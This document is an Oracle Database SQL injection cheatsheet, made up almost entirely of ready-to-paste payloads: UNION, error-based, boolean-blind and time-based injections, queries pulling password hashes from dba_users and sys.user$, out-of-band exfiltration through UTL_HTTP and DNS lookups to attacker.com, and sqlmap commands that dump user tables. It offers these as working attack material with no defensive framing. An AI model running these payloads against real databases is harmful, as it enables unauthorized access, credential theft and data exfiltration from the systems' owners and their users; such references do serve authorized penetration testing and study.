# Oracle Database SQL Injection Cheatsheet

## Version & Info
```sql
SELECT * FROM v$version
SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'
SELECT * FROM v$instance
SELECT user FROM dual
SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual
SELECT SYS_CONTEXT('USERENV','HOST') FROM dual
SELECT SYS_CONTEXT('USERENV','IP_ADDRESS') FROM dual
```

## Database Enumeration
```sql
-- All accessible tables
SELECT table_name FROM all_tables
SELECT table_name FROM user_tables    -- Current user only
SELECT table_name FROM dba_tables     -- Requires DBA

-- Tables in specific schema
SELECT table_name FROM all_tables WHERE owner='TARGET_SCHEMA'

-- Columns
SELECT column_name,data_type FROM all_tab_columns
WHERE table_name='USERS' AND owner='SCHEMA_NAME'

-- All schemas
SELECT DISTINCT owner FROM all_tables
```

## User Enumeration
```sql
-- All users
SELECT username,password FROM dba_users    -- Requires DBA
SELECT name,password FROM sys.user$        -- Requires DBA

-- Current user
SELECT user FROM dual

-- User privileges
SELECT * FROM session_privs
SELECT * FROM user_sys_privs
SELECT grantee,privilege FROM dba_sys_privs WHERE grantee=user

-- Is DBA?
SELECT COUNT(*) FROM session_privs WHERE privilege='DBA'
```

## UNION-Based Payloads
```sql
-- Oracle REQUIRES FROM dual or table for SELECT
UNION SELECT NULL FROM dual--
UNION SELECT NULL,NULL FROM dual--
UNION SELECT banner FROM v$version WHERE ROWNUM=1--

-- List tables
UNION SELECT table_name,NULL FROM all_tables WHERE ROWNUM=1--

-- Extract data with offset (no LIMIT, use ROWNUM)
SELECT username,password FROM users WHERE ROWNUM=1
-- Row 2+: use subquery
SELECT * FROM (SELECT a.*,ROWNUM rnum FROM (SELECT username,password FROM users) a WHERE ROWNUM<=10) WHERE rnum>=2
```

## Error-Based Payloads
```sql
-- XMLType method
AND 1=UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62)))

-- UTL_INADDR method
AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual))

-- CTXSYS.DRITHSX.SN method
AND 1=CTXSYS.DRITHSX.SN(user,(SELECT user FROM dual))

-- dbms_xdb_version.checkin
AND 1=dbms_xdb_version.checkin((SELECT user FROM dual))
```

## Boolean Blind Payloads
```sql
-- True/False (Oracle requires FROM dual)
AND 1=1--    (true)
AND 1=2--    (false)

-- Extract data
AND SUBSTR(user,1,1)='S'
AND ASCII(SUBSTR(user,1,1))>83

-- Table name extraction
AND (SELECT SUBSTR(table_name,1,1) FROM all_tables WHERE ROWNUM=1)='A'
```

## Time-Based Payloads
```sql
-- DBMS_PIPE (blocks for specified seconds)
AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(65)||CHR(65),5)

-- Heavy query (may vary)
AND 1=(SELECT COUNT(*) FROM all_objects t1, all_objects t2, all_objects t3)

-- Conditional with DBMS_PIPE
AND (CASE WHEN (1=1) THEN 1 ELSE DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5) END)=1
AND (CASE WHEN (SUBSTR(user,1,1)='S') THEN 1 ELSE DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5) END)=1
```

## Out-of-Band (HTTP)
```sql
-- UTL_HTTP (requires network access)
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual

-- UTL_INADDR (DNS)
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') FROM dual

-- UTL_FILE (file operations)
DECLARE
  fh UTL_FILE.FILE_TYPE;
BEGIN
  fh := UTL_FILE.FOPEN('/tmp','output.txt','W');
  UTL_FILE.PUT_LINE(fh, (SELECT user FROM dual));
  UTL_FILE.FCLOSE(fh);
END;
```

## Oracle-Specific Bypass Techniques

No stacked queries by default. Workarounds:
```sql
-- Use heavy queries for time-based
-- Use UTL_HTTP for OOB
-- Use error-based for data extraction

-- Oracle does NOT support:
-- SLEEP()   -> use DBMS_PIPE
-- LIMIT     -> use ROWNUM
-- GROUP_CONCAT -> use LISTAGG
-- IF()      -> use CASE WHEN

-- LISTAGG (Oracle 11g+) instead of GROUP_CONCAT
SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name)
FROM all_tables WHERE owner='SCHEMA'
```

## SQLMap Commands for Oracle
```bash
# Basic detection (Oracle needs FROM dual, sqlmap handles this)
sqlmap -u "URL?id=1" --dbms=oracle --batch

# Full enumeration
sqlmap -u "URL?id=1" --dbms=oracle --current-user --current-db --is-dba --dbs --batch

# Dump table
sqlmap -u "URL?id=1" --dbms=oracle -D SCHEMA -T USERS --dump --batch

# Time-based (use DBMS_PIPE)
sqlmap -u "URL?id=1" --dbms=oracle --technique=T --batch

# Error-based
sqlmap -u "URL?id=1" --dbms=oracle --technique=E --batch
```
